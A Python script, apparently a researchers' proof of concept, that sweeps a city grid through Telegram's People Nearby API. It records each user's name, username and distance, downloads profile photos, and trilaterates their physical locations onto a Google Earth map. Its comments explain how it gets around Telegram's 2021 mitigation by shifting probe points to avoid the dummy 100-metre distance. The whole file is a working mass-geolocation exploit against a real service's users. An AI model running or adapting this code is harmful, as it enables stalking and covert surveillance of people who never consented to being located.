#!/usr/bin/env python

# Summary: This scripts gather data from the Telegram people around some coordinates or city
#          Then, it uses the information gathered to geolocate the user using trilateration.
#          This is a scanner. It will scan through a whole city to find the location of all users of the app in the city
# Authors: Felipe Molina (@felmoltor), Emmanuel Cristofaro (@stutm)
# Date: 2021-03

# General libraries
import os,sys
from pathlib import Path
import csv
from optparse import OptionParser
import math
from time import sleep
from random import randint,uniform
import matplotlib.pyplot as plt
from ColorMessages import *
import pandas as pd
# Telegram Libraries
from datetime import datetime
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon.tl.types import PeerLocated,PeerChannel,PeerUser,PeerSelfLocated
# Geographic Libraries
from geopy.geocoders import Nominatim
from shapely import geometry
import pyproj
import utm
from shapely.geometry import LineString
import simplekml
from polycircles import polycircles

USER_AGENT="Telegram Bot/1.0"
APP_ID="<YOUR APP ID NUMBER>"
APP_HASH="<INSERT YOUR APP HASH>"
APP_NAME='My Telegram Test'
SAMPLE_SIZE=4
COOLDOWN=90         # Cooldown time (in seconds) before asking Telegram again for the same username
FOUND_COOLDOWN=60   # Cooldown time (in seconds) before asking Telegram for a new geo position around the target username
# Since January 2021, Telegram patched the trilateration vulnerability doing this two things:
# * Reduced the number of people you get with the People Nearby functionality, now it only displays user closer than ~2 Km, whereas before you could see people furhter than 6 Km away
# * Return a dummy value of 100 meters when you get too close to your target
# * Use a bigger map grid where the target is positioned in the map. Before, you could have a 10 meters range distance error with your target.
# To be sure that we are not going to receive the dummy distance of 100 meters from the Telegram servers
# We add aproximately 111 meters to the east to our chosen point.
# We use the aproximations proposed on this page: https://www.usna.edu/Users/oceano/pguth/md_help/html/approx_equivalents.htm
# 1° = 111 km
# 0.001° = 111 m
# 0.003° = 333 m
# 0.004° = 444 m
SKEWED_DEGREES=0.003
MOVE_PROBE_ATTEMPTS=3
DUMMY_DISTANCE=100
FORCE_MOVE_ATTEMPTS=5   # Number of times we will fail to locate a target before cancelling the script
COOLDOWN_BASE=20
OK_THRESHOLD=10     # Distance to stop querying Telegram for the target user
CIRCLE_RESOLUTION=180
TARGET_FILE="data/target.csv"
GOOGLE_EARTH_PATH="/usr/bin/google-earth-pro"

class TelegramUser():
    def __init__(self,username=None,user_id=None,first_name=None,last_name=None,distance=None,point=None):
        self.username=username
        self.user_id=user_id
        self.first_name=first_name
        self.last_name=last_name
        self.distance=distance
        self.from_point=point
        self.found=False
        self.latitude=None
        self.longitude=None
        self.photo_path=None

def get_options():
    parser = OptionParser()
    parser.add_option("--start-coords", dest="start_coords",
                    help="Starting coordinates of the map grid", default=None)
    parser.add_option("--stop-coords", dest="stop_coords",
                    help="Stoping coordinates of the map grid", default=None)
    parser.add_option("-A", "--analysisonly", dest="analysis_only",
                    help="Only analyse the database of our hard drive", default=False, action="store_true")
    parser.add_option("-d", "--database", dest="database",
                    help="Database file name", default="data/scans/app1database.csv")
    parser.add_option("-o", "--output", dest="output",
                    help="Output file name", default="data/scans/app1scan.csv")
    parser.add_option("-k", "--kml", dest="kml",
                    help="Output KML path", default="output/scans/app1scans.kml")
    parser.add_option("-R", "--resolution", dest="grid_resolution",
                    help="Grid resolution. A.K.A. number of GPS probes per row and colum", default=3)
    parser.add_option("-P", "--proxy", dest="proxy",
                    help="Proxy to send the requests through (default: None)", default=None)
    parser.add_option("-q", "--quiet",
                    action="store_false", dest="verbose", default=True,
                    help="don't print status messages to stdout")

    (options, args) = parser.parse_args()
    return options

# This function return the a different cooldown time for each iteration following the exponential backoff retry
def get_cooldown(n):
    return COOLDOWN_BASE*(math.pow(2,n-1))

# Formula extracted from https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# If we get to close to the poles ir radius is very big, this will fail
def getPerimeterPoint(center,dx,dy):
    r_earth = 6378000 # 6378 Km of radius = 6378000 metres
    # Number of Km per degree of longitude
    # (2*math.pi/360) * r_earth * cos(point.latitude)
    # Number of Km per degree of latitude
    # ((2*math.pi)/360) * r_earth = 111 km / degree 
    new_latitude  = center.y  + (dy / r_earth) * (180.0 / math.pi)
    new_longitude = center.x + (dx / r_earth) * (180.0 / math.pi) / math.cos(center.y * math.pi/180.0)
    return geometry.Point(new_latitude,new_longitude)

# This function will return the poligon drawing the circle around the center point with a radius of r
def getCirclePoints(center,radius,resolution=180):
    perimeter_points=[]
    # Iterate through the number of points around the center
    for n in range(1,resolution+1):
        # Divide the 360 degrees of a circle in "resolution" samples
        degree=n*(360.0/resolution)
        dx=math.cos(math.radians(degree))*radius
        dy=math.sin(math.radians(degree))*radius
        ppoint=(getPerimeterPoint(center,dx,dy))
        # print("#%s - Alpha %s: %s,%s" % (n,degree,ppoint.x,ppoint.y))
        perimeter_points.append(ppoint)
    
    poly = geometry.Polygon([[p.x, p.y] for p in perimeter_points])
    return poly

def getUserArray(userID, userDistance, res):
    output = []
    us=None
    for item in res:
        if userID == item.id:
            us = {
                "id":item.id, 
                "first_name":item.first_name, 
                "last_name":item.last_name, 
                "username":item.username, 
                "phone":item.phone, 
                "distance":str(userDistance)
                }
            break
        
    return us

def getTelegramUserPhoto(user_id,user_name=None):
    fname=Path("images/telegram/scanner/%s_%s.jpg" % (user_id,user_name)).absolute()
    if (not os.path.exists(fname)):
        info("Downloading photo of user %s (%s)" % (user_id,user_name))
        with TelegramClient(APP_NAME, APP_ID, APP_HASH) as client:
            client.download_profile_photo(user_id,file=fname)
    else:
        info("Not downloading photo of user %s (%s). We already got it." % (user_id,user_name))

    return fname

def getTelegramNearbyPeople(center):
    now_epoch=int(datetime.now().timestamp())
    # Ask Telegram API for the users around the point "center"
    with TelegramClient(APP_NAME, APP_ID, APP_HASH) as client:
        result = client(functions.contacts.GetLocatedRequest(
            geo_point=types.InputGeoPoint(
                lat=center.y,
                long=center.x
            ),
            self_expires=60
        ))
    return result

# Return a random set of user from the whole set of users returned by Telegram servers
def extractRandomSamples(users_json):
    samples=[]
    for n in range(0,SAMPLE_SIZE):
        i=randint(0,len(users_json)-1)
        samples.append(users_json[i])
    return samples

# Compare the json received from Telegram servers with the information of previous interactions.
# The variable "old_data_samples" is an dictionary containing randomdata from the previous interaction
def isDataUpdated(peers,old_data_samples):
    # Format of the entry
    # {
    #  "latitude": center.y,
    #  "longitude": center.x,
    #  "distance": userDistance,
    #  "user_id": userID,
    #  "first_name": f["first_name"],
    #  "last_name": f["last_name"],
    #  "username": f["username"]
    # }
    data_is_updated=True
    if (old_data_samples is not None):
        for sample in old_data_samples:
            target_peer=None
            for p in peers:
                if (p.__class__ == PeerLocated and p.peer.__class__ == PeerUser):
                    if (p.peer.user_id == sample["id"]):
                        target_peer=p
                        break
            if (target_peer is not None):
                if float(target_peer.distance) == float(sample["distance"]):
                    data_is_updated=False

    return data_is_updated

# This function retrieves the user details and distances around one point
# It compare the results with the last iteration to see if we have to wait a little to ask the server again
# To do this comparison, the variable "old_data_samples" contain a number of rows from the previous batch to
# compare with the new user batch
def saveUsersAround(point,database,old_data_samples):   
    users_array=[]
    invalid_data=True
    n_failed_attempts=0
    current_probe=point
    now_epoch=int(datetime.now().timestamp())
    
    while (invalid_data):
        result=getTelegramNearbyPeople(current_probe)
        peers = result.updates[0].peers
        users = result.users
        if (len(peers)>1):
            # Check if the data has been updated comparing with the previous interactino
            if (isDataUpdated(peers,old_data_samples)):
                invalid_data=False
                n_failed_attempts=0
                info("Telegram servers answered us with new user data around the point %s,%s." % (current_probe.y,current_probe.x))
            
                # Save results in the csv file and check if the target user is in the results
                with open(database,"a+") as out:
                    csvwriter=csv.writer(out,delimiter=",")
                    # i = 1 # Starts at one, because element 0 is self and does not contain the user_id attribute
                    for currentp in peers:
                        if ((currentp.__class__) == PeerLocated):
                            if (currentp.peer.__class__ == PeerUser):
                                userID = currentp.peer.user_id 
                                userDistance = currentp.distance
                                f = getUserArray(userID, userDistance, users)
                                users_array.append(f)
                                data_array=(now_epoch,current_probe.y,current_probe.x,userDistance,userID,f["first_name"],f["last_name"],f["username"],"user")
                                row = "%s,%s,%s,%s,%s,%s,%s,%s,%s" % data_array
                                csvwriter.writerow(data_array)
                                info("User %s %s (%s) found %s meters away from %s,%s" % (f["first_name"],f["last_name"],f["username"],userDistance,point.y,point.x))
                            elif (currentp.peer.__class__ == PeerChannel):
                                channelID = currentp.peer.channel_id 
                                channelDistance = currentp.distance
                                data_array = (now_epoch,current_probe.y,current_probe.x,channelDistance,channelID,"N/A","N/A","N/A","channel")
                                row = "%s,%s,%s,%s,%s,%s,%s,%s,%s" % data_array
                                csvwriter.writerow(data_array)
                            else:
                                error("Error. Entity on this row is neither a user nor an channel")
                                continue
            # Data returned from Telegram servers is the same as the last interaction:
            else:
                invalid_data=True
                n_failed_attempts+=1
                c=get_cooldown(n_failed_attempts)
                error("Telegram returned same info as in the last interaction. Waiting %s seconds to interact again with their servers." % c)
                sleep(c)
        else:
            invalid_data=True
            n_failed_attempts+=1
            c=get_cooldown(n_failed_attempts)
            error("Telegram returned no results. Waiting %s seconds to interact again with their servers." % c)
            sleep(c)
        
        # If we have tried several times but the Telegram servers answers are empty or are the same
        # we move the current point a few hundred meters away from here
        if (n_failed_attempts >= FORCE_MOVE_ATTEMPTS):
            info("Moving the probing point a few hundred meters away from here")
            current_probe=geometry.Point([current_probe.x+SKEWED_DEGREES,current_probe.y]) # x,y

        
    return users_array

def drawTargetKml(output,kml_file,open_kml=True,download_picture=True):
    kml=simplekml.Kml()

    with open(output,"r") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')

        measure_n=0
        for row in csv_reader:
            measure_n+=1
            min_epoch=int(row[0])
            max_epoch=int(row[1])
            latitude=float(row[2])
            longitude=float(row[3])
            user_id=int(row[4])
            user_name=row[5]
            user_surname=row[6]
            username=row[7]
            
            # Download user photo if the URL exists
            user_picture=None
            if (download_picture):
                user_picture=getTelegramUserPhoto(user_id,user_name=None)
            
            # Set up point parameters
            d1=datetime.fromtimestamp(min_epoch).strftime('%Y-%m-%d %H:%M:%S')
            d2=datetime.fromtimestamp(max_epoch).strftime('%Y-%m-%d %H:%M:%S')
            description="%s %s (%s) [%s] \nDates between %s and %s\n" % (user_name, user_surname, username,user_id,d1,d2)
            point_name="%s %s" % (user_name,user_surname)
            target_point=kml.newpoint(name=point_name)
            target_point.coords=[(longitude,latitude)]
            if (user_picture is not None):
                target_point.description='%s<br/><img src="%s" alt="Target Photo" align="left" width=150 height=250 />' % (description,user_picture)
            else:
                target_point.description='%s<br/>' % (description)
   
    kml.save(kml_file)

    # If open is true, open with Google Earth
    if (open_kml):
        if (os.path.exists(GOOGLE_EARTH_PATH)):
            os.system('xdg-open %s' % kml_file)
        else:
            print("Google Earth path not found. Open the file '%s' manually to see the location of the target.")

################

if __name__ == "__main__":
    # Parsing options
    options=get_options()
    init_point=None
    
    if (options.start_coords is not None and options.stop_coords is not None):
        # Calculate the scanning grid
        (slat,slong)=[float(c.strip()) for c in options.start_coords.split(",")]
        (elat,elong)=[float(c.strip()) for c in options.stop_coords.split(",")]
    else:
        error("Error. You have to specify the starting and ending coordinates of the grid to scan (--start-coords and --stop-coords).")
        exit(1)

    # Check if the database and output files already exists
    owd=owo=False
    if (os.path.exists(options.database)):
        owd=((input("Database file %s already exists. Do you want to overwrite it (selecting N will append data) [y/N]: " % options.database)).upper() == "Y")
        if (owd):
            os.remove(options.database)

    if (os.path.exists(options.output)):
        owo=((input("Output file %s already exists. Do you want to overwrite it (selecting N will append data) [y/N]: " % options.output)).upper() == "Y")
        if (owo):
            os.remove(options.output)

    # If we want to retrieve fresh data from the servers
    if (not options.analysis_only):
        # To unify criteria, we want to scan north to south and west to east
        if (slat-elat)<0:
            # ending latitude is north to the starting lat
            # Swaping starting and ending latitude
            s=slat
            slat=elat
            elat=s
        if (slong-elong)>0:
            # Ending longitude is to the west of the starting long
            s=slong
            slog=elong
            elong=s
        
        # If no increments have been specified on the arguments
        # we calculate the increments as a GRID_RESOLUTION delta on each coordinate
        lat_diff=abs(slat-elat)
        long_diff=abs(slong-elong)
        lat_delta=lat_diff/float(options.grid_resolution)
        long_delta=long_diff/float(options.grid_resolution)

        # scan north to south , west to east
        cp=geometry.Point([float(slong),float(slat)]) # x,y
        data_samples=None
        while (cp.y>=elat): 
            cp=geometry.Point([float(slong),cp.y]) # x,y
            while (cp.x<=elong): # west to east
                # Scan nearby for users
                info("Scanning for users around %s,%s..." % (cp.y,cp.x))
                users=saveUsersAround(cp,options.database,data_samples)
                data_samples=extractRandomSamples(users)
                info("Found %s users" % len(users))
                # Move the current probing point to the east (+)
                cp=geometry.Point([cp.x+long_delta,cp.y]) 
                c=get_cooldown(1)
                info("Sleeping %s seconds" % c)
                sleep(c)
            
            # Move the current probing point to the south (-)
            cp=geometry.Point([cp.x,cp.y-lat_delta]) 

    ############################
    # Analysis of the database #
    ############################

    # Now, draw the users of the social network in a map
    geo_data = pd.read_csv(options.database,names=["epoch","lat","long","distance","id","name","surname","username","type"])
    
    # Delete duplicated rows, taking only in account the distance and the user ID. Those could be invalid measures sent by the server
    geo_data.drop_duplicates(subset=["distance","id"],inplace=True,ignore_index=True)
    geo_data.drop(geo_data[geo_data.type=="channel"].index,inplace=True)
    # For each user ID in the database, find at least three probes where the user was located
    for user_id in geo_data.id.unique():
        user_hits=geo_data[geo_data.id==user_id]
        row=user_hits[0:1]
        if (len(user_hits)<3):
            info("User %s (%s) found less than three times in the scan. Ignoring." % (user_id,row.name.values[0]))
        else:
            # Use only the first three rows of the subset for the calculation of the position
            resulting_rows=user_hits[:3]
            # Calculate the three circles
            row1=resulting_rows[0:1]
            row2=resulting_rows[1:2]
            row3=resulting_rows[2:3]
            ce1=geometry.Point([float(row1.long),float(row1.lat)]) 
            ce2=geometry.Point([float(row2.long),float(row2.lat)]) 
            ce3=geometry.Point([float(row3.long),float(row3.lat)]) 
            c1=getCirclePoints(ce1,float(row1.distance),resolution=CIRCLE_RESOLUTION)
            c2=getCirclePoints(ce2,float(row2.distance),resolution=CIRCLE_RESOLUTION)
            c3=getCirclePoints(ce3,float(row3.distance),resolution=CIRCLE_RESOLUTION)
            # Intersect the three circles and mark the closest intersections as the potential location of the user 
            # The intersection between three circles give us 6 intersection points
            # inter12 contains the two intersection points between circle 1 and 2
            # inter23 contains the two intersection points between circle 3 and 3
            # inter13 contains the two intersection points between circle 1 and 3
            circle1_points=LineString(list(c1.exterior.coords))
            circle2_points=LineString(list(c2.exterior.coords))
            circle3_points=LineString(list(c3.exterior.coords))

            
            # Intersect circle 1 and 2
            if (c1.intersects(c2)):
                inter12=circle1_points.intersection(circle2_points)
            else:
                error("Error. Circle 1 and 2 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue
            
            # Intersect circle 2 and 3
            if (c2.intersects(c3)):
                inter23=circle2_points.intersection(circle3_points)
            else:
                error("Error. Circle 2 and 3 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue
           
            # Intersect circle 1 and 3
            if (c1.intersects(c3)):
                inter13=circle1_points.intersection(circle3_points)
            else:
                error("Error. Circle 1 and 3 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue

            # Now, to detect the closerpoints of the 6 intersections, the algorithm
            # 1. Calculate intersections iter12 (candidate1,candidate2)
            # 2. Calculate intersections iter23 (i231,i232)
            # 2. Calculate intersections iter23 (i131,i132)
            # 3. Calculate distances of i231 and i232 to candidate1 ==> d1, d2
            # 4. Select the minimum of these to distances ==> min_d1
            # 5. Calculate distances of i231 and i232 to candidate2 ==> d3, d4
            # 6. Select the minimum of these to distances ==> min_d2
            # 7. Select the min of min_d1 and min_d2 ==> min_d1d2
            # 8. Calculate distances of i131 and i132 to candidate1 ==> d5, d6
            # 4. Select the minimum of these to distances ==> min_d3
            # 5. Calculate distances of i131 and i132 to candidate2 ==> d7, d8
            # 6. Select the minimum of these to distances ==> min_d4
            # 7. Select the min of min_d3 and min_d4 ==> min_d3d4
            if (inter23.__class__ == geometry.LineString or inter12.__class__ == geometry.LineString or inter13.__class__ == geometry.LineString):
                error("The intersection of any of the three circles failed. Skipping to the next user.")
                continue
            else: 
                (candidate1,candidate2)=inter12

                dist_c1_i23_1=candidate1.distance(inter23[0])
                dist_c1_i23_2=candidate1.distance(inter23[1])
                dist_c2_i23_1=candidate2.distance(inter23[0])
                dist_c2_i23_2=candidate2.distance(inter23[1])

                dist_c1_i13_1=candidate1.distance(inter13[0])
                dist_c1_i13_2=candidate1.distance(inter13[1])
                dist_c2_i13_1=candidate2.distance(inter13[0])
                dist_c2_i13_2=candidate2.distance(inter13[1])
                selector = {
                    # intersections circles 2 and 3
                    dist_c1_i23_1:inter23[0],
                    dist_c1_i23_2:inter23[1],
                    dist_c2_i23_1:inter23[0],
                    dist_c2_i23_2:inter23[1],
                    # intersections circles 1 and 3
                    dist_c1_i13_1:inter13[0],
                    dist_c1_i13_2:inter13[1],
                    dist_c2_i13_1:inter13[0],
                    dist_c2_i13_2:inter13[1],
                }

                inter23_min=min(dist_c1_i23_1,dist_c1_i23_2,dist_c2_i23_1,dist_c2_i23_2)
                inter13_min=min(dist_c1_i13_1,dist_c1_i13_2,dist_c2_i13_1,dist_c2_i13_2)

                # Save the intersection points
                p23 = selector[inter23_min]
                p13 = selector[inter13_min]
                fc1=fc2=fc=None
                # What would be the the suposed cadidate location point if we look to the intersections between c2 and c3
                if (inter23_min == dist_c1_i23_1 or inter23_min == dist_c1_i23_2):
                    fc1=candidate1
                else:
                    fc1=candidate2
                # What would be the the suposed cadidate location point if we look to the intersections between c1 and c3
                if (inter13_min == dist_c1_i13_1 or inter13_min == dist_c1_i13_2):
                    fc2=candidate1
                else:
                    fc2=candidate2
                # Error control
                if (fc1 != fc2):
                    error("%s (%s): Some fuckery happened when calculating the location candidate point. Ignoring this user." % (user_id,row1.name.values[0]))
                else:
                    fc=fc1
                    # Create a poligon with vertices in fc,p13 and p23 and the centroid will be the potential location of the user
                    pointList = [fc, p13, p23, fc]
                    poly = geometry.Polygon([[p.x, p.y] for p in pointList])
                    centroid=poly.centroid
                    # I don't know but the intersection() call returns X and Y coordinates switched, so we restore here the correct order: X=Longitude and Y=Latitude
                    potential_location=geometry.Point([float(centroid.y),float(centroid.x)])
                    success("%s (%s): Sucesfully located the user in %s,%s." % (int(row1.id),row1.name.values[0],float(potential_location.y),float(potential_location.x)))
                    # Save the data in the output file
                    with open(options.output,"a") as out:
                        max_time=resulting_rows.epoch.max()
                        min_time=resulting_rows.epoch.max()
                        csvwriter=csv.writer(out,delimiter=",")
                        data_array=(min_time,max_time,potential_location.y,potential_location.x,int(row1.id),row1.name.values[0],row1.surname.values[0],row1.username.values[0])
                        csvwriter.writerow(data_array)


    # Finished gathering user data, now to draw the KML    
    print("Generating the result KML file")
    drawTargetKml(options.output,options.kml,open_kml=True,download_picture=True)

